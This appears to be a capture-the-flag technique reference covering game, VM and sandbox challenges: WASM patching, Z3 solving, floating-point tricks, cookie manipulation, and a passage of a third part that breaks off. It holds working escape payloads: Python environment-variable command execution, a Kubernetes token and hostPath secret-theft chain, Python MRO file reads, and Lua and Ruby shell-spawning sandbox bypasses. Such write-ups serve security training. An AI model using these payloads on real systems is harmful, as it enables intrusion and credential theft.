# CTF Misc - Games, VMs & Constraint Solving (Part 1)

## Table of Contents
- [WASM Game Exploitation via Patching](#wasm-game-exploitation-via-patching)
- [Roblox Place File Reversing](#roblox-place-file-reversing)
- [PyInstaller Extraction](#pyinstaller-extraction)
  - [Opcode Remapping](#opcode-remapping)
- [Marshal Code Analysis](#marshal-code-analysis)
  - [Bytecode Inspection Tips](#bytecode-inspection-tips)
- [Python Environment RCE](#python-environment-rce)
- [Z3 Constraint Solving](#z3-constraint-solving)
  - [YARA Rules with Z3](#yara-rules-with-z3)
  - [Type Systems as Constraints](#type-systems-as-constraints)
  - [Z3 SAT Solving for Boolean Logic Gate Networks (BSidesSF 2026)](#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026)
- [Kubernetes RBAC Bypass](#kubernetes-rbac-bypass)
  - [K8s Privilege Escalation Checklist](#k8s-privilege-escalation-checklist)
- [Floating-Point Precision Exploitation](#floating-point-precision-exploitation)
  - [Finding Exploitable Values](#finding-exploitable-values)
  - [Exploitation Strategy](#exploitation-strategy)
  - [Why It Works](#why-it-works)
  - [Red Flags in Challenges](#red-flags-in-challenges)
  - [Quick Test Script](#quick-test-script)
- [Custom Assembly Language Sandbox Escape (EHAX 2026)](#custom-assembly-language-sandbox-escape-ehax-2026)
- [Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)](#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016)
- [Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)](#ruby-sandbox-escape-via-tracepointtrace-hitcon-2017)
- [Pixel-Sampling BFS Maze Auto-Solver (HackCon 2018)](#pixel-sampling-bfs-maze-auto-solver-hackcon-2018)
- [References](#references)

---

## WASM Game Exploitation via Patching

**Pattern (Tac Tic Toe, Pragyan 2026):** Game with unbeatable AI in WebAssembly. Proof/verification system validates moves but doesn't check optimality.

**Key insight:** If the proof generation depends only on move positions and seed (not on whether moves were optimal), patching the WASM to make the AI play badly produces a beatable game with valid proofs.

**Patching workflow:**
```bash
# 1. Convert WASM binary to text format
wasm2wat main.wasm -o main.wat

# 2. Find the minimax function (look for bestScore initialization)
# Change initial bestScore from -1000 to 1000
# Flip comparison: i64.lt_s -> i64.gt_s (selects worst moves instead of best)

# 3. Recompile
wat2wasm main.wat -o main_patched.wasm
```

**Exploitation:**
```javascript
const go = new Go();
const result = await WebAssembly.instantiate(
  fs.readFileSync("main_patched.wasm"), go.importObject
);
go.run(result.instance);

InitGame(proof_seed);
// Play winning moves against weakened AI
for (const m of [0, 3, 6]) {
    PlayerMove(m);
}
const data = GetWinData();
// Submit data.moves and data.proof to server -> valid!
```

**General lesson:** In client-side game challenges, always check if the verification/proof system is independent of move quality. If so, patch the game logic rather than trying to beat it.

---

## Roblox Place File Reversing

**Pattern (MazeRunna, 0xFun 2026):** Roblox game where the flag is hidden in an older published version. Latest version contains a decoy flag.

**Step 1: Identify target IDs from game page HTML:**
```python
placeId = 75864087736017
universeId = 8920357208
```

**Step 2: Pull place versions via Roblox Asset Delivery API:**
```bash
# Requires .ROBLOSECURITY cookie (rotate after CTF!)
for v in 1 2 3; do
  curl -H "Cookie: .ROBLOSECURITY=..." \
    "https://assetdelivery.roblox.com/v2/assetId/${PLACE_ID}/version/$v" \
    -o place_v${v}.rbxlbin
done
```

**Step 3: Parse .rbxlbin binary format:**
The Roblox binary place format contains typed chunks:
- **INST** — defines class buckets (Script, Part, etc.) and referent IDs
- **PROP** — per-instance property values (including `Source` for scripts)
- **PRNT** — parent→child relationships forming the object tree

```python
# Pseudocode for extracting scripts
for chunk in parse_chunks(data):
    if chunk.type == 'PROP' and chunk.field == 'Source':
        for referent, source in chunk.entries:
            if source.strip():
                print(f"[{get_path(referent)}] {source}")
```

**Step 4: Diff script sources across versions.**
- v3 (latest): `Workspace/Stand/Color/Script` → fake flag
- v2 (older): same path → real flag

**Key lessons:**
- Always check **version history** — latest version may be a decoy
- Roblox Asset Delivery API exposes all published versions
- Rotate `.ROBLOSECURITY` cookie immediately after use (it's a full session token)

---

## PyInstaller Extraction

```bash
python pyinstxtractor.py packed.exe
# Look in packed.exe_extracted/
```

### Opcode Remapping
If decompiler fails with opcode errors:
1. Find modified `opcode.pyc`
2. Build mapping to original values
3. Patch target .pyc
4. Decompile normally

---

## Marshal Code Analysis

```python
import marshal, dis
with open('file.bin', 'rb') as f:
    code = marshal.load(f)
dis.dis(code)
```

### Bytecode Inspection Tips
- `co_consts` contains literal values (strings, numbers)
- `co_names` contains referenced names (function names, variables)
- `co_code` is the raw bytecode
- Use `dis.Bytecode(code)` for instruction-level iteration

---

## Python Environment RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**Other dangerous environment variables:**
- `PYTHONSTARTUP` - Script executed on interactive startup
- `PYTHONPATH` - Inject modules via path hijacking
- `PYTHONINSPECT` - Drop to interactive shell after script

**How PYTHONWARNINGS works:** Setting `PYTHONWARNINGS=ignore::antigravity.Foo::0` triggers `import antigravity`, which opens a URL via `$BROWSER`. Control `$BROWSER` to execute arbitrary commands.

---

## Z3 Constraint Solving

```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
s.add(flag[0] == ord('f'))  # Known prefix
# Add constraints...
if s.check() == sat:
    print(bytes([s.model()[f].as_long() for f in flag]))
```

### YARA Rules with Z3
```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()

# Literal bytes
for i, byte in enumerate([0x66, 0x6C, 0x61, 0x67]):
    s.add(flag[i] == byte)

# Character range
for i in range(4):
    s.add(flag[i] >= ord('A'))
    s.add(flag[i] <= ord('Z'))

if s.check() == sat:
    m = s.model()
    print(bytes([m[f].as_long() for f in flag]))
```

### Type Systems as Constraints
**OCaml GADTs / advanced types encode constraints.**

Don't compile - extract constraints with regex and solve with Z3:
```python
import re
from z3 import *

matches = re.findall(r"\(\s*([^)]+)\s*\)\s*(\w+)_t", source)
# Convert to Z3 constraints and solve
```

### Z3 SAT Solving for Boolean Logic Gate Networks (BSidesSF 2026)

**Pattern (flag-factory-pro):** A "product key" validation system is implemented as a network of 250 boolean logic gates (AND, OR, XOR, NOT) connected by wires. Given 125 boolean input bits and the gate truth values (all gates must output True), find a valid assignment of input bits. This is a classic satisfiability (SAT) problem solvable with Z3.

```python
from z3 import *
import base64

# Parse the gate network from challenge data
data = base64.b64decode(registration_request)
gates = parse_gates(data)  # List of (gate_type, input_wires, output_wire)

# Create 125 boolean variables for input bits
inputs = [Bool(f"x_{i}") for i in range(125)]

# Map wire IDs to Z3 expressions
wires = {i: inputs[i] for i in range(125)}

solver = Solver()
for gate_type, in1, in2, out in gates:
    w1 = wires[in1]
    w2 = wires[in2] if in2 is not None else None

    if gate_type == "AND":
        wires[out] = And(w1, w2)
    elif gate_type == "OR":
        wires[out] = Or(w1, w2)
    elif gate_type == "XOR":
        wires[out] = Xor(w1, w2)
    elif gate_type == "NOT":
        wires[out] = Not(w1)

    # All gate outputs must be True
    solver.add(wires[out] == True)

if solver.check() == sat:
    model = solver.model()
    # Extract 125 bits, encode as base32 in 5-bit groups
    # model_completion=True so unconstrained inputs evaluate to False instead of None
    bits = [1 if is_true(model.eval(inputs[i], model_completion=True)) else 0 for i in range(125)]
    # Convert to product key format
    key = bits_to_base32(bits)
    print(f"Product key: {key}")
```

**Key insight:** Boolean logic gate networks are directly expressible as Z3 constraints. Each gate becomes one constraint (`And`, `Or`, `Xor`, `Not`), and the requirement that all outputs are True constrains the solution space. Even with 125 input variables and 250 gates, Z3 solves this in milliseconds. Any "keygen" or "product key" challenge with observable validation logic can be modeled this way.

**When to recognize:** Challenge involves product key validation, license key generation, circuit/gate diagrams, or registration code verification. If the validation logic is extractable (from binary, network capture, or provided spec), model it as a SAT/SMT problem. Z3 handles boolean, bitvector, integer, and real arithmetic constraints.

**References:** BSidesSF 2026 "flag-factory-pro"

---

## Kubernetes RBAC Bypass

**Pattern (CTFaaS, LACTF 2026):** Container deployer with claimed ServiceAccount isolation.

**Attack chain:**
1. Deploy probe container that reads in-pod ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
2. Verify token can impersonate deployer SA (common misconfiguration)
3. Create pod with `hostPath` volume mounting `/` -> read node filesystem
4. Extract kubeconfig (e.g., `/etc/rancher/k3s/k3s.yaml`)
5. Use node credentials to access hidden namespaces and read secrets

```bash
# From inside pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
```

### K8s Privilege Escalation Checklist
- Check RBAC: `kubectl auth can-i --list`
- Look for pod creation permissions (can create privileged pods)
- Check for hostPath volume mounts allowed in PSP/PSA
- Look for secrets in environment variables of other pods
- Check for service mesh sidecars leaking credentials

---

## Floating-Point Precision Exploitation

**Pattern (Spare Me Some Change):** Trading/economy games where large multipliers amplify tiny floating-point errors.

**Key insight:** When decimal values (0.01-0.99) are multiplied by large numbers (e.g., 1e15), floating-point representation errors create fractional remainders that can be exploited.

### Finding Exploitable Values
```python
mult = 1000000000000000  # 10^15

# Find values where multiplication creates useful fractional errors
for i in range(1, 100):
    x = i / 100.0
    result = x * mult
    frac = result - int(result)
    if frac > 0:
        print(f'x={x}: {result} (fraction={frac})')

# Common values with positive fractions:
# 0.07 -> 70000000000000.0078125
# 0.14 -> 140000000000000.015625
# 0.27 -> 270000000000000.03125
# 0.56 -> 560000000000000.0625
```

### Exploitation Strategy
1. **Identify the constraint**: Need `balance >= price` AND `inventory >= fee`
2. **Find favorable FP error**: Value where `x * mult` has positive fraction
3. **Key trick**: Sell the INTEGER part of inventory, keeping the fractional "free money"

**Example (time-travel trading game):**
```text
Initial: balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
Multiplier: 1e15 (time travel)

# Buy 0.56, travel through time:
balance = (5.0 - 0.56) * 1e15 = 4439999999999999.5
inventory = 0.56 * 1e15 = 560000000000000.0625

# Sell exactly 560000000000000 (integer part):
balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee

# Now: balance >= flag_price AND inventory >= fee
```

### Why It Works
- Float64 has ~15-16 significant digits precision
- `(5.0 - 0.56) * 1e15` loses precision -> rounds to exact 5e15 when added
- `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
- The asymmetric rounding gives you slightly more total value than you started with

### Red Flags in Challenges
- "Time travel amplifies everything" (large multipliers)
- Trading games with buy/sell + special actions
- Decimal currency with fees or thresholds
- "No decimals allowed" after certain operations (forces integer transactions)
- Starting values that seem impossible to win with normal math

### Quick Test Script
```python
def find_exploit(mult, balance_needed, inventory_needed):
    """Find x where selling int(x*mult) gives balance>=needed with inv>=needed"""
    for i in range(1, 500):
        x = i / 100.0
        if x >= 5.0:  # Can't buy more than balance
            break
        inv_after = x * mult
        bal_after = (5.0 - x) * mult

        # Sell integer part of inventory
        sell = int(inv_after)
        final_bal = bal_after + sell
        final_inv = inv_after - sell

        if final_bal >= balance_needed and final_inv >= inventory_needed:
            print(f'EXPLOIT: buy {x}, sell {sell}')
            print(f'  final_balance={final_bal}, final_inventory={final_inv}')
            return x
    return None

# Example usage:
find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
```

---

## Custom Assembly Language Sandbox Escape (EHAX 2026)

**Pattern (Chusembly):** Web app with custom instruction set (LD, PUSH, PROP, CALL, IDX, etc.) running on a Python backend. Safety check only blocks the word "flag" in source code.

**Key insight:** `PROP` (property access) and `CALL` (function invocation) instructions allow traversing Python's MRO chain from any object to achieve RCE, similar to Jinja2 SSTI.

**Exploit chain:**
```text
LD 0x48656c6c6f A     # Load "Hello" string into register A
PROP __class__ A      # str → <class 'str'>
PROP __base__ E       # str → <class 'object'> (E = result register)
PROP __subclasses__ E # object → bound method
CALL E                # object.__subclasses__() → list of all classes
# Find os._wrap_close at index 138 (varies by Python version)
IDX 138 E             # subclasses[138] = os._wrap_close
PROP __init__ E       # get __init__ method
PROP __globals__ E    # access function globals
# Use __getitem__ to access builtins without triggering keyword filter
PUSH 0x5f5f6275696c74696e735f5f  # "__builtins__" as hex
CALL __getitem__ E               # globals["__builtins__"]
# Bypass "flag" keyword filter with hex encoding
PUSH 0x666c61672e747874          # "flag.txt" as hex
CALL open E                      # open("flag.txt")
CALL read E                      # read file contents
STDOUT E                         # print flag
```

**Filter bypass techniques:**
- **Hex-encoded strings:** `0x666c61672e747874` → `"flag.txt"` bypasses keyword filters
- **os.popen for shell:** If file path is unknown, use `os.popen('ls /').read()` then `os.popen('cat /flag*').read()`
- **Subclass index discovery:** Iterate through `__subclasses__()` list to find useful classes (os._wrap_close, subprocess.Popen, etc.)

**General approach for custom language challenges:**
1. **Read the docs:** Check `/docs`, `/help`, `/api` endpoints for instruction reference
2. **Find the result register:** Many custom languages have a special register for return values
3. **Test string handling:** Try hex-encoded strings to bypass keyword filters
4. **Chain Python MRO:** Any Python string object → `__class__.__base__.__subclasses__()` → RCE
5. **Error messages leak info:** Intentional errors reveal Python internals and available classes

---

## Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)

Lua sandboxes that filter `load()` and `os.execute()` by name can be bypassed if function references exist in other accessible tables or through string concatenation of function names.

```lua
-- Common Lua sandbox restrictions:
-- os.execute blocked, load blocked, require blocked

-- Bypass 1: If string.find is available, use it to test for allowed functions
-- then access via table indexing
local f = os["execute"]  -- table index bypass if only os.execute() call is blocked
f("cat /flag")

-- Bypass 2: Use loadstring (alias for load in Lua 5.1)
loadstring("os.execute('cat /flag')")()

-- Bypass 3: Via debug library (if available)
debug.getregistry()  -- access internal Lua registry

-- Bypass 4: Bytecode execution (compile outside, load bytecode)
-- Compile payload: luac -o payload.luac payload.lua
-- Load bytecode in sandbox (may bypass source-level filters)

-- Bypass 5: Concatenation to build function names
local cmd = "exe" .. "cute"
os[cmd]("cat /flag")

-- Bypass 6: Via io library
io.popen("cat /flag"):read("*a")
```

**Key insight:** Lua sandboxes typically filter specific function *calls* but not *table lookups*. Access blocked functions through table indexing (`os["execute"]`), string concatenation for function names, or alternate I/O libraries (`io.popen`). Also check if `loadstring` (Lua 5.1 alias for `load`) is unblocked.

---

## Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)

**Pattern:** Ruby sandbox uses `set_trace_func` to monitor execution and block dangerous calls. Bypass: register a `TracePoint` hook for `:c_call` events. TracePoint fires at the C-extension level, before Ruby-level `set_trace_func` hooks activate.

```ruby
TracePoint.trace(:c_call) do |tp|
  system('sh')
end
```

The hook fires on the next C-level call (e.g., `puts`, any method call), executing `system('sh')` before the sandbox monitor can intercept it.

**Why it works:** `TracePoint` (introduced in Ruby 2.0) operates at a lower level than `set_trace_func`. `:c_call` hooks fire when any C-implemented method is invoked, which happens before the Ruby event system that `set_trace_func` relies on processes the event.

**Key insight:** `TracePoint` operates at a lower level than `set_trace_func` in Ruby — C-call hooks fire before Ruby-level event hooks, allowing sandbox escape. Any subsequent C-method call (even benign ones) triggers the payload.

---

## Pixel-Sampling BFS Maze Auto-Solver (HackCon 2018)

**Pattern:** Challenge streams a PNG of a grid maze and expects the player to type WASD moves within a tight time limit. Manual solving is impossible at scale, but the maze is a uniform grid — each cell is exactly `N` pixels wide and each wall is 1 cell wide.

**Solver pipeline:**
```python
import requests, numpy as np
from collections import deque
from PIL import Image
from io import BytesIO

CELL = 10  # measured cell width in pixels

def fetch_grid(url):
    img = np.array(Image.open(BytesIO(requests.get(url).content)).convert('L'))
    rows, cols = img.shape[0] // CELL, img.shape[1] // CELL
    # 1 = wall (dark pixel at cell center), 0 = open
    grid = [[1 if img[r*CELL + CELL//2, c*CELL + CELL//2] < 128 else 0
             for c in range(cols)] for r in range(rows)]
    return grid

def bfs(grid, start, goal):
    dirs = [(-1, 0, 'W'), (1, 0, 'S'), (0, -1, 'A'), (0, 1, 'D')]
    q = deque([(start, '')])
    seen = {start}
    while q:
        (r, c), path = q.popleft()
        if (r, c) == goal:
            return path
        for dr, dc, m in dirs:
            nr, nc = r + dr, c + dc
            if (0 <= nr < len(grid) and 0 <= nc < len(grid[0])
                    and grid[nr][nc] == 0 and (nr, nc) not in seen):
                seen.add((nr, nc))
                q.append(((nr, nc), path + m))
```

Measure `CELL` once by inspecting the first row of the image; then every maze in the same challenge series decodes to a boolean grid and BFS yields the move sequence in milliseconds.

**Key insight:** Any image-driven CTF game can be turned into a graph problem by sampling one pixel per logical cell — pick the cell center, not the border, so wall thickness doesn't poison the result. Build the grid, BFS, and output the move string. The same pattern works for color-coded mazes (`img[r*CELL+CELL//2, c*CELL+CELL//2]` with RGB comparison) and for 3D isometric grids after an affine rectification.

**References:** HackCon 2018 — writeup 10764

---

## References
- Pragyan 2026 "Tac Tic Toe": WASM minimax patching
- LACTF 2026 "CTFaaS": K8s RBAC bypass via hostPath
- 0xL4ugh CTF: PyInstaller + opcode remapping
- 0xFun 2026 "MazeRunna": Roblox version history + binary place file parsing
- EHAX 2026 "Chusembly": Custom assembly language with Python MRO chain RCE
- HITCON 2017: Ruby TracePoint sandbox escape

---

See also: [games-and-vms.md](#part-2) for cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequences, Brainfuck instrumentation, and WASM memory manipulation.

See also: [games-and-vms.md](#part-3) for memfd_create packed binaries, multi-phase crypto games with HMAC commitment-reveal and GF(256) Nim, emulator ROM-switching state preservation, Python marshal code injection, Benford's Law bypass, parallel connection oracle relay, nonogram solver pipelines, 100 prisoners problem, C code jail escape via emoji identifiers, and BuildKit daemon build secret exploitation.

---

# Part 2

## Table of Contents
- [Cookie Checkpoint Game Brute-Forcing (BYPASS CTF 2025)](#cookie-checkpoint-game-brute-forcing-bypass-ctf-2025)
- [Flask Session Cookie Game State Leakage (BYPASS CTF 2025)](#flask-session-cookie-game-state-leakage-bypass-ctf-2025)
- [WebSocket Game Manipulation + Cryptic Hint Decoding (BYPASS CTF 2025)](#websocket-game-manipulation--cryptic-hint-decoding-bypass-ctf-2025)
- [Server Time-Only Validation Bypass (BYPASS CTF 2025)](#server-time-only-validation-bypass-bypass-ctf-2025)
- [De Bruijn Sequence for Substring Coverage (BearCatCTF 2026)](#de-bruijn-sequence-for-substring-coverage-bearcatctf-2026)
- [Brainfuck Interpreter Instrumentation (BearCatCTF 2026)](#brainfuck-interpreter-instrumentation-bearcatctf-2026)
- [WASM Linear Memory Manipulation (BearCatCTF 2026)](#wasm-linear-memory-manipulation-bearcatctf-2026)
- [References](#references)

---

## Cookie Checkpoint Game Brute-Forcing (BYPASS CTF 2025)

**Pattern (Signal from the Deck):** Server-side game where selecting tiles increases score. Incorrect choice resets the game. Score tracked via session cookies.

**Technique:** Save cookies before each guess, restore on failure to avoid resetting progress.

```python
import requests

URL = "https://target.example.com"

def solve():
    s = requests.Session()
    s.post(f"{URL}/api/new")

    while True:
        data = s.get(f"{URL}/api/signal").json()
        if data.get('done'):
            break

        checkpoint = s.cookies.get_dict()

        for tile_id in range(1, 10):
            r = s.post(f"{URL}/api/click", json={'clicked': tile_id})
            res = r.json()

            if res.get('correct'):
                if res.get('done'):
                    print(f"FLAG: {res.get('flag')}")
                    return
                break
            else:
                s.cookies.clear()
                s.cookies.update(checkpoint)
```

**Key insight:** Session cookies act as save states. Preserving and restoring cookies on failure enables deterministic brute-forcing without game reset penalties.

---

## Flask Session Cookie Game State Leakage (BYPASS CTF 2025)

**Pattern (Hungry, Not Stupid):** Flask game stores correct answers in signed session cookies. Use `flask-unsign -d` to decode the cookie and reveal server-side game state without playing.

```bash
# Decode Flask session cookie (no secret needed for reading)
flask-unsign -d -c '<cookie_value>'
```

**Example decoded state:**
```json
{
  "all_food_pos": [{"x": 16, "y": 12}, {"x": 16, "y": 28}, {"x": 9, "y": 24}],
  "correct_food_pos": {"x": 16, "y": 28},
  "level": 0
}
```

**Key insight:** Flask session cookies are signed but not encrypted by default. `flask-unsign -d` decodes them without the secret key, exposing server-side game state including correct answers.

**Detection:** Base64-looking session cookies with periods (`.`) separating segments. Flask uses `itsdangerous` signing format.

---

## WebSocket Game Manipulation + Cryptic Hint Decoding (BYPASS CTF 2025)

**Pattern (Maze of the Unseen):** Browser-based maze game with invisible walls. Checkpoints verified server-side via WebSocket. Cryptic hint encodes target coordinates.

**Technique:**
1. Open browser console, inspect WebSocket messages and `player` object
2. Decode cryptic hints (e.g., "mosquito were not available" → MQTT → port 1883)
3. Teleport directly to target coordinates via console

```javascript
function teleport(x, y) {
    player.x = x;
    player.y = y;
    verifyProgress(Math.round(player.x), Math.round(player.y));
    console.log(`Teleported to x:${player.x}, y:${player.y}`);
}

// "mosquito" → MQTT (port 1883), "not available" → 404
teleport(1883, 404);
```

**Common cryptic hint mappings:**
- "mosquito" → MQTT (Mosquitto broker, port 1883)
- "not found" / "not available" → HTTP 404
- Port numbers, protocol defaults, or ASCII values as coordinates

**Key insight:** Browser-based games expose their state in the JS console. Modify `player.x`/`player.y` or equivalent properties directly, then call the progress verification function.

---

## Server Time-Only Validation Bypass (BYPASS CTF 2025)

**Pattern (Level Devil):** Side-scrolling game requiring traversal of a map. Server validates that enough time has elapsed (map_length / speed) but doesn't verify actual movement.

```python
import requests
import time

TARGET = "https://target.example.com"

s = requests.Session()
r = s.post(f"{TARGET}/api/start")
session_id = r.json().get('session_id')

# Wait for required traversal time (e.g., 4800px / 240px/s = 20s + margin)
time.sleep(25)

s.post(f"{TARGET}/api/collect_flag", json={'session_id': session_id})
r = s.post(f"{TARGET}/api/win", json={'session_id': session_id})
print(r.json().get('flag'))
```

**Key insight:** When servers validate only elapsed time (not player position, inputs, or movement), start a session, sleep for the required duration, then submit the win request. Always check if the game API has start/win endpoints that can be called directly.

---

## De Bruijn Sequence for Substring Coverage (BearCatCTF 2026)

**Pattern (Brown's Revenge):** Server generates random n-bit binary code each round. Input must contain the code as a substring. Pass 20+ rounds with a single fixed input under a character limit.

```python
def de_bruijn(k, n):
    """Generate de Bruijn sequence B(k, n): cyclic sequence containing
    every k-ary string of length n exactly once as a substring."""
    a = [0] * k * n
    sequence = []
    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p+1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    return sequence

# For 12-bit binary codes: B(2, 12) has length 4096
seq = ''.join(map(str, de_bruijn(2, 12)))
payload = seq + seq[:11]  # Linearize: 4096 + 11 = 4107 chars
# Every possible 12-bit code appears as a substring
```

**Key insight:** De Bruijn sequence B(k, n) contains all k^n possible n-length strings over alphabet k as substrings, with cyclic length k^n. To linearize (non-cyclic), append the first n-1 characters. Total length = k^n + n - 1. Send the same string every round — it contains every possible code.

**Detection:** Must find arbitrary n-bit pattern as substring of limited-length input. Character budget matches de Bruijn length (k^n + n - 1).

---

## Brainfuck Interpreter Instrumentation (BearCatCTF 2026)

**Pattern (Ghost Ship):** Large Brainfuck program (10K+ instructions) validates a flag character-by-character. Full reverse engineering is impractical.

**Per-character brute-force via instrumentation:**
1. Instrument a Brainfuck interpreter to track tape cell values
2. Identify a "wrong count" cell that increments per incorrect character
3. For each position, try all printable ASCII — pick the character that doesn't increment the wrong counter

```python
def run_bf_instrumented(code, input_bytes, max_steps=500000):
    tape = [0] * 30000
    dp, ip, inp_idx = 0, 0, 0
    for _ in range(max_steps):
        if ip >= len(code): break
        c = code[ip]
        if c == '+': tape[dp] = (tape[dp] + 1) % 256
        elif c == '-': tape[dp] = (tape[dp] - 1) % 256
        elif c == '>': dp += 1
        elif c == '<': dp -= 1
        elif c == '.': pass  # output
        elif c == ',':
            tape[dp] = input_bytes[inp_idx] if inp_idx < len(input_bytes) else 0
            inp_idx += 1
        elif c == '[' and tape[dp] == 0:
            # skip to matching ]
            ...
        elif c == ']' and tape[dp] != 0:
            # jump back to matching [
            ...
        ip += 1
    return tape

# Brute-force: ~40 positions × 95 chars = 3800 runs
flag = []
for pos in range(40):
    for c in range(32, 127):
        candidate = flag + [c] + [ord('A')] * (39 - pos)
        tape = run_bf_instrumented(code, candidate)
        if tape[WRONG_COUNT_CELL] == 0:  # No errors up to this position
            flag.append(c)
            break
```

**Key insight:** Brainfuck programs that validate input character-by-character can be brute-forced without understanding the program logic. Instrument the interpreter to observe tape state, find the cell that tracks validation progress, and optimize per-character search. ~3800 runs completes in minutes.

---

## WASM Linear Memory Manipulation (BearCatCTF 2026)

**Pattern (Dubious Doubloon):** Browser game compiled to WebAssembly with win conditions requiring luck (e.g., 15 consecutive coin flips). WASM linear memory is flat and unprotected.

**Direct memory patching in Node.js:**
```javascript
const { readFileSync } = require('fs');
const wasmBuffer = readFileSync('game.wasm');
const { instance } = await WebAssembly.instantiate(wasmBuffer, imports);
const mem = new DataView(instance.exports.memory.buffer);

// Patch game variables at known offsets
mem.setInt32(0x102918, 14, true);   // streak counter = 14 (need 15)
mem.setInt32(0x102898, 100, true);  // win chance = 100%

// One more flip → guaranteed win → flag decoded
const result = instance.exports.flipCoin();
```

**Key insight:** Unlike WAT patching (modifying the binary), memory manipulation patches runtime state after loading. All WASM variables live in flat linear memory at fixed offsets. Use `wasm-objdump -x game.wasm` or search for known constants to find variable offsets. No need to understand the full game logic — just set the state to "about to win".

**Detection:** WASM game requiring statistically impossible sequences (streaks, perfect scores). Game logic is in `.wasm` file loadable in Node.js.

---

## References
- BYPASS CTF 2025 "Signal from the Deck": Cookie checkpoint game brute-forcing
- BYPASS CTF 2025 "Hungry, Not Stupid": Flask cookie game state leakage
- BYPASS CTF 2025 "Maze of the Unseen": WebSocket teleportation + cryptic hints
- BYPASS CTF 2025 "Level Devil": Server time-only validation bypass
- BearCatCTF 2026 "Brown's Revenge": De Bruijn sequence substring coverage
- BearCatCTF 2026 "Ghost Ship": Brainfuck instrumentation brute-force
- BearCatCTF 2026 "Dubious Doubloon": WASM linear memory state patching

---

See also: [games-and-vms.md](games-and-vms.md) for WASM patching, Roblox reversing, PyInstaller, Z3, K8s RBAC, floating-point exploitation, custom assembly sandbox escape, and multi-phase crypto games.

---

# Part 3

## Table of Contents
- [memfd_create Packed Binaries](#memfd_create-packed-binaries)
- [Multi-Phase Interactive Crypto Game (EHAX 2026)](#multi-phase-interactive-crypto-game-ehax-2026)
- [Emulator ROM-Switching State Preservation (BSidesSF 2026)](#emulator-rom-switching-state-preservation-bsidessf-2026)
- [Python Marshal Code Injection (iCTF 2013)](#python-marshal-code-injection-ictf-2013)
- [Benford's Law Frequency Distribution Bypass (iCTF 2013)](#benfords-law-frequency-distribution-bypass-ictf-2013)
- [Parallel Connection Oracle Relay (Hack.lu 2015)](#parallel-connection-oracle-relay-hacklu-2015)
- [Nonogram Solver to QR Code Pipeline (SECCON 2015)](#nonogram-solver-to-qr-code-pipeline-seccon-2015)
- [100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)](#100-prisoners-problem--cycle-following-strategy-sharif-ctf-2016)
- [C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)](#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026)
  - [Step 1: Integer construction from emoji](#step-1-integer-construction-from-emoji)
  - [Step 2: Embed gadgets via add eax constant encoding](#step-2-embed-gadgets-via-add-eax-constant-encoding)
  - [Step 3: Stack-based ROP via push rsp; pop rsi; syscall](#step-3-stack-based-rop-via-push-rsp-pop-rsi-syscall)
  - [Step 4: ROP chain to mprotect + read + shellcode](#step-4-rop-chain-to-mprotect--read--shellcode)
  - [Step 5: Shellcode with glob for unknown flag path](#step-5-shellcode-with-glob-for-unknown-flag-path)
- [BuildKit Daemon Exploitation for Build Secrets (BSidesSF 2026)](#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026)
- [Docker Container Escape Techniques](#docker-container-escape-techniques)
  - [Privileged Container Breakout](#privileged-container-breakout)
  - [Docker Socket Escape](#docker-socket-escape)
  - [Capability-Based Escape (CAP_SYS_ADMIN)](#capability-based-escape-cap_sys_admin)
  - [Container Information Leakage](#container-information-leakage)
- [15-Puzzle Solvability as Bit Encoder (SharifCTF 8)](#15-puzzle-solvability-as-bit-encoder-sharifctf-8)
- [Levenshtein Distance Oracle Attack (SunshineCTF 2016)](#levenshtein-distance-oracle-attack-sunshinectf-2016)
- [SECCOMP Bypass via High-Bit File Descriptor Trick (33C3 CTF 2016)](#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016)
- [rvim Jail Escape via Custom vimrc with Python3 Execution (BKP 2017)](#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017)
- [Restricted vim Escape via CTRL-W F and netrw File Browser (TokyoWesterns 2018)](#restricted-vim-escape-via-ctrl-w-f-and-netrw-file-browser-tokyowesterns-2018)
- [Taint Analysis Bypass in Custom Language via Type Coercion (PlaidCTF 2018)](#taint-analysis-bypass-in-custom-language-via-type-coercion-plaidctf-2018)
- [Shredded Document Pixel-Edge Reassembly Under Time Pressure (Nuit du Hack CTF 2018)](#shredded-document-pixel-edge-reassembly-under-time-pressure-nuit-du-hack-ctf-2018)
- [References](#references)

---

## memfd_create Packed Binaries

```python
from Crypto.Cipher import ARC4
cipher = ARC4.new(b"key")
decrypted = cipher.decrypt(encrypted_data)
open("dumped", "wb").write(decrypted)
```

**Key insight:** Binaries using `memfd_create` execute payloads entirely in memory, leaving no file on disk. Intercept the decrypted payload before `fexecve` by hooking `memfd_create` or dumping `/proc/pid/fd/` entries, then analyze the dumped binary normally.

---

## Multi-Phase Interactive Crypto Game (EHAX 2026)

